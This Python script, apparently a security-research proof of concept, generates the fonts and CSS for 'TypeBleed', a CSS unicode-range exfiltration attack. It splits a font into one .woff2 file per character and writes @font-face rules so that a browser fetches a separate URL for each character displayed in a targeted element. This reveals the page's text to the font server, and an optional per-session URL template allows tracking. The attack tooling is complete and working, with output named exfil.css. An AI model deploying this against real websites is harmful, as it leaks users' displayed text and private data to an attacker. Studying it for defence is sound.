#!/usr/bin/env python3
"""
TypeBleed Font Generator
========================
Splits a base font into per-character .woff2 subset files and generates
the corresponding CSS @font-face rules for unicode-range exfiltration.

Usage:
    python generate.py [--font PATH] [--output DIR] [--css PATH]

Requires: fonttools, brotli (for woff2 support)
    pip install fonttools brotli

If no --font is provided, downloads Inter Regular from Google Fonts.
"""

import argparse
import os
import struct
import sys
import urllib.request

# Character coverage for TypeBleed
CHARACTERS = {}

# a-z
for cp in range(0x0061, 0x007B):
    CHARACTERS[cp] = chr(cp)
# A-Z
for cp in range(0x0041, 0x005B):
    CHARACTERS[cp] = chr(cp)
# 0-9
for cp in range(0x0030, 0x003A):
    CHARACTERS[cp] = chr(cp)
# Space
CHARACTERS[0x0020] = "space"
# Common punctuation
for ch in ".!?,'\"-():;/@#$%&*+=":
    CHARACTERS[ord(ch)] = ch
# Currency
for ch in "€£¥₿":
    CHARACTERS[ord(ch)] = ch
# Special
for ch in "<>{}[]|\\~^_":
    CHARACTERS[ord(ch)] = ch


def download_inter_font(dest_path):
    """Download Inter Regular as the base font."""
    url = (
        "https://github.com/rsms/inter/raw/master/docs/font-files/"
        "Inter-Regular.woff2"
    )
    # Fallback: use Google Fonts static URL
    gf_url = (
        "https://fonts.gstatic.com/s/inter/v18/"
        "UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuLyfAZ9hjQ.woff2"
    )

    print("[*] Downloading Inter Regular font...")
    for attempt_url in [gf_url, url]:
        try:
            req = urllib.request.Request(attempt_url, headers={
                "User-Agent": "TypeBleed-FontGen/1.0"
            })
            resp = urllib.request.urlopen(req, timeout=30)
            data = resp.read()
            with open(dest_path, "wb") as f:
                f.write(data)
            print(f"[+] Downloaded {len(data)} bytes -> {dest_path}")
            return True
        except Exception as e:
            print(f"[-] Failed from {attempt_url}: {e}")
    return False


def create_minimal_woff2(codepoint):
    """
    Create a minimal valid WOFF2 font containing a single glyph for the
    given codepoint. This is used as a fallback when fonttools/brotli
    are not available.

    The font contains:
    - .notdef glyph (required)
    - One glyph mapped to the target codepoint
    """
    # We'll create a minimal TTF first, then if brotli is available,
    # compress to WOFF2. Otherwise return the TTF bytes to be wrapped.
    try:
        from fontTools.ttLib import TTFont
        from fontTools.fontBuilder import FontBuilder

        fb = FontBuilder(1000, isTTF=True)
        fb.setupGlyphOrder([".notdef", "target"])
        fb.setupCharacterMap({codepoint: "target"})

        fb.setupGlyf({
            ".notdef": {"numberOfContours": 0},
            "target": {"numberOfContours": 0},
        })

        fb.setupHorizontalMetrics({
            ".notdef": (500, 0),
            "target": (500, 0),
        })
        fb.setupHorizontalHeader(ascent=800, descent=-200)

        fb.setupNameTable({
            "familyName": "TypeBleed",
            "styleName": "Regular",
        })

        fb.setupOs2(sTypoAscender=800, sTypoDescender=-200,
                     sTypoLineGap=0, usWinAscent=800, usWinDescent=200)
        fb.setupPost()
        fb.setupHead(unitsPerEm=1000)

        font = fb.font
        return font

    except ImportError:
        return None


def subset_font_fonttools(base_font_path, codepoint, output_path):
    """Use fonttools subsetter to extract a single character from base font."""
    try:
        from fontTools.subset import Subsetter, Options
        from fontTools.ttLib import TTFont

        options = Options()
        options.flavor = "woff2"
        options.desubroutinize = True

        font = TTFont(base_font_path)
        subsetter = Subsetter(options=options)
        subsetter.populate(unicodes=[codepoint])

        try:
            subsetter.subset(font)
            font.flavor = "woff2"
            font.save(output_path)
            return True
        except Exception:
            # If subsetting fails (char not in font), create minimal font
            return False

    except ImportError:
        return False


def generate_font_for_codepoint(base_font_path, codepoint, output_path):
    """Generate a .woff2 file for a single codepoint."""
    # Try subsetting from base font first
    if base_font_path and os.path.exists(base_font_path):
        if subset_font_fonttools(base_font_path, codepoint, output_path):
            return True

    # Fallback: create minimal font from scratch
    font = create_minimal_woff2(codepoint)
    if font is not None:
        try:
            font.flavor = "woff2"
            font.save(output_path)
            return True
        except Exception:
            # If woff2 fails (no brotli), save as .woff2 extension but TTF
            # Browsers are generally forgiving with font formats
            try:
                font.save(output_path)
                return True
            except Exception as e:
                print(f"  [-] Failed to save font for U+{codepoint:04X}: {e}")
                return False

    print(f"  [-] Cannot generate font for U+{codepoint:04X} "
          "(install fonttools+brotli)")
    return False


def generate_css(characters, font_dir_url="/fonts/char",
                 session_template=False):
    """
    Generate CSS @font-face rules for all characters.

    If session_template is True, URLs use /fonts/t/{session_id}/ pattern
    for per-session tracking.
    """
    rules = []
    rules.append("/* TypeBleed - CSS unicode-range exfiltration */")
    rules.append("/* Generated by fonts/generate.py */")
    rules.append("/* Security Research PoC - Bountyy Oy */\n")

    for codepoint in sorted(characters.keys()):
        char_name = characters[codepoint]
        hex_cp = f"{codepoint:04X}"

        if session_template:
            url = "{{{{ font_base }}}}/{hex}.woff2".replace("{hex}", hex_cp)
        else:
            url = f"{font_dir_url}/{hex_cp}.woff2"

        comment = char_name if len(char_name) == 1 else f"({char_name})"
        rules.append(f"@font-face {{")
        rules.append(f"  font-family: 'TypeBleed';")
        rules.append(f"  src: url('{url}') format('woff2');")
        rules.append(f"  unicode-range: U+{hex_cp}; /* {comment} */")
        rules.append(f"}}\n")

    # Apply the font
    rules.append("/* Apply TypeBleed font to target elements */")
    rules.append(".typebleed-target {")
    rules.append("  font-family: 'TypeBleed', sans-serif;")
    rules.append("}")

    return "\n".join(rules)


def main():
    parser = argparse.ArgumentParser(
        description="TypeBleed Font Generator - Split font into "
                    "per-character .woff2 files"
    )
    parser.add_argument(
        "--font", "-f",
        help="Path to base font file (TTF/OTF/WOFF2). "
             "If not provided, downloads Inter Regular.",
        default=None,
    )
    parser.add_argument(
        "--output", "-o",
        help="Output directory for per-character .woff2 files",
        default=os.path.join(os.path.dirname(__file__), "char"),
    )
    parser.add_argument(
        "--css",
        help="Output path for generated CSS file",
        default=os.path.join(os.path.dirname(os.path.dirname(__file__)),
                             "demo", "exfil.css"),
    )
    parser.add_argument(
        "--session-template",
        help="Generate CSS with session ID template placeholders",
        action="store_true",
    )

    args = parser.parse_args()

    # Check dependencies
    try:
        import fontTools
        print(f"[+] fonttools version: {fontTools.__version__}")
    except ImportError:
        print("[!] fonttools not installed. Install with: "
              "pip install fonttools brotli")
        sys.exit(1)

    try:
        import brotli
        print("[+] brotli available (woff2 compression enabled)")
        has_brotli = True
    except ImportError:
        print("[!] brotli not installed. Fonts will be larger. "
              "Install with: pip install brotli")
        has_brotli = False

    # Get or download base font
    base_font_path = args.font
    if base_font_path is None:
        base_font_path = os.path.join(os.path.dirname(__file__),
                                       "Inter-Regular.woff2")
        if not os.path.exists(base_font_path):
            if not download_inter_font(base_font_path):
                print("[!] Could not download base font. "
                      "Will create minimal fonts from scratch.")
                base_font_path = None

    # Create output directory
    os.makedirs(args.output, exist_ok=True)

    # Generate per-character fonts
    print(f"\n[*] Generating {len(CHARACTERS)} per-character font files...")
    success = 0
    failed = 0

    for codepoint in sorted(CHARACTERS.keys()):
        hex_cp = f"{codepoint:04X}"
        char_display = CHARACTERS[codepoint]
        if len(char_display) == 1:
            char_display = repr(char_display)

        output_path = os.path.join(args.output, f"{hex_cp}.woff2")

        if generate_font_for_codepoint(base_font_path, codepoint,
                                        output_path):
            size = os.path.getsize(output_path)
            print(f"  [+] U+{hex_cp} {char_display:>8s} -> "
                  f"{hex_cp}.woff2 ({size} bytes)")
            success += 1
        else:
            failed += 1

    print(f"\n[*] Generated: {success} fonts, {failed} failures")

    # Generate CSS
    css_dir = os.path.dirname(args.css)
    if css_dir:
        os.makedirs(css_dir, exist_ok=True)

    css_content = generate_css(CHARACTERS,
                                session_template=args.session_template)
    with open(args.css, "w") as f:
        f.write(css_content)

    print(f"[+] CSS written to {args.css}")
    print(f"\n[*] TypeBleed font generation complete.")
    print(f"    Font files: {args.output}/")
    print(f"    CSS file:   {args.css}")
    print(f"\n    Total characters covered: {len(CHARACTERS)}")


if __name__ == "__main__":
    main()
